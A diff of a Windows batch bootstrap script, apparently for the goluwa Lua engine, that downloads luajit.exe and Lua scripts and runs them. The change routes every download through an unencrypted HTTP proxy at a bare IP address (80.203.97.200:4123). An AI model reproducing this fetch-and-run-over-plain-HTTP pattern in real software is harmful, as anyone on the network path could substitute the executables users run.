@@ -12,8 +12,9 @@ set APP_NAME=appexample
 set ARG_LINE=%*
 set BINARY_DIR=core\bin\!OS!_!ARCH!
 set BINARY_NAME=luajit.exe
-set BASE_BINARY_URL=https://gitlab.com/CapsAdmin/goluwa-binaries/raw/master/core/bin/!OS!_!ARCH!/!BINARY_NAME!
-set BASE_SCRIPT_URL=https://gitlab.com/CapsAdmin/goluwa/raw/master/
+set BASE_BINARY_URL=https://gitlab.com/CapsAdmin/goluwa-binaries/raw/master/core/bin/!OS!_!ARCH!/
+set BASE_SCRIPT_URL=https://gitlab.com/CapsAdmin/goluwa/raw/develop/
+set HTTP_TUNNEL=http://80.203.97.200:4123/
 set SCRIPT_PATH=core/lua/boot.lua
 
 IF %0 == "%~0" set RAN_FROM_FILEBROWSER=1
@@ -91,7 +92,7 @@ SetLocal
 			pause
 
 			EndLocal
-			goto Start
+			goto:eof
 		)
 
 		echo. 2>!directory!\lua_downloaded_and_validated
@@ -123,7 +124,7 @@ SetLocal
 
 			echo try { >> !tmp_name!
 			echo var req = new ActiveXObject^("Microsoft.XMLHTTP"^) >> !tmp_name!
-			echo req.Open^("GET","!url!",false^) >> !tmp_name!
+			echo req.Open^("GET","!HTTP_TUNNEL!!url!",false^) >> !tmp_name!
 			echo req.Send^(^) >> !tmp_name!
 
 			echo var stream = new ActiveXObject^("ADODB.Stream"^) >> !tmp_name!
